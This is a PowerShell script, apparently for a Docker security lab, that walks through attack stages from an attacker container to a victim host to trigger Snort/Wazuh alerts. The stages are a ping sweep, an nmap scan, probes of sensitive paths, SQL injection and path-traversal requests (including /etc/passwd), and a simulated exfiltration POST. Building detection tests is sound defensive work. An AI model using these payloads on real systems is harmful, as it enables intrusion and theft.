param(
    [string]$TargetHost = "victim",
    [string]$TargetPort = "8080"
)

$ErrorActionPreference = "Stop"

function Invoke-Stage {
    param(
        [string]$Title,
        [scriptblock]$Command
    )

    Write-Host ""
    Write-Host "============================================================"
    Write-Host $Title
    Write-Host "============================================================"

    try {
        & $Command
    } catch {
        Write-Warning $_.Exception.Message
    }
}

Invoke-Stage "Stage 1 (Recon) - ping sweep al objetivo ($TargetHost)" {
    docker compose exec attacker ping -c 3 $TargetHost
}

Invoke-Stage "Stage 2 (Service discovery) - nmap multi-puerto 22,80,445,3306,$TargetPort" {
    docker compose exec attacker nmap -sS -p "22,80,445,3306,$TargetPort" --max-retries 1 -T4 $TargetHost
}

Invoke-Stage "Stage 3 (Web probe) - acceso a rutas sensibles en ${TargetHost}:${TargetPort}" {
    foreach ($path in @("/admin", "/login", "/.env", "/phpmyadmin", "/wp-admin", "/config")) {
        Write-Host " -> $path"
        docker compose exec attacker curl -s -o /dev/null -w "    http %{http_code}`n" "http://${TargetHost}:${TargetPort}${path}"
    }
}

Invoke-Stage "Stage 4 (Exploit attempt) - SQLi / path-traversal en la URI" {
    docker compose exec attacker curl -s -o /dev/null "http://${TargetHost}:${TargetPort}/search?q=%27+OR+1=1+--+"
    docker compose exec attacker curl -s -o /dev/null "http://${TargetHost}:${TargetPort}/index?id=1+UNION+SELECT+1,2,3"
    docker compose exec attacker curl -s -o /dev/null "http://${TargetHost}:${TargetPort}/file?path=../../../etc/passwd"
}

Invoke-Stage "Stage 5 (Exfiltration/C2) - POST con User-Agent automatizado" {
    foreach ($i in 1..3) {
        docker compose exec attacker sh -lc "head -c 256 /dev/urandom | base64 | tr -d '\n' | xargs -I{} curl -s -o /dev/null -X POST -A 'python-requests/2.28.1' -d 'exfil={}' 'http://${TargetHost}:${TargetPort}/upload'"
    }
}

Write-Host ""
Write-Host "============================================================"
Write-Host "Escenario completo. Consultas utiles en Wazuh Dashboard:"
Write-Host "------------------------------------------------------------"
Write-Host 'agent.name:"victim-agent" AND location:"/var/log/snort/alert"'
Write-Host 'agent.name:"victim-agent" AND rule.id:(100360 OR 100361 OR 100362 OR 100363 OR 100364)'
Write-Host 'agent.name:"victim-agent" AND rule.id:(100390 OR 100391)'
Write-Host "============================================================"
